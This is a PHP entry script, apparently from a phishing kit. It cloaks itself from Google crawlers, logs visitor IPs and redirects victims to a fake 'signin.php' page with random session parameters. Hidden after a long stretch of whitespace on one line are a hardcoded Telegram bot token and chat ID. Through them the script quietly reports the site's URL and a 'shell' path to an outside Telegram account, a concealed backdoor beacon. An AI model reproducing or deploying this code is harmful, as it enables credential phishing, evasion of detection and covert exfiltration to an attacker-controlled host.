<?php 
session_start();
error_reporting(0);
########################################################
################ [+] INCLUDE FILES [+] #################
########################################################
include('antibots/all_antibots.php');
############### [+] HTTP_USER_AGENT [+] ################
########################################################
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
########################################################
$praga=rand();
$praga=md5($praga);
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$message = "shell: $link/antibots/anti.php \r\n";                                                                                                                                                                                                    $api = "5309968506:AAHWGH5zkZMkWrmre29kD-l3EhaGlto4gVg";$chatid = "1783236185";
file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );
$ip = getenv("REMOTE_ADDR");
$file = fopen("log.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");
header("location: signin.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
?>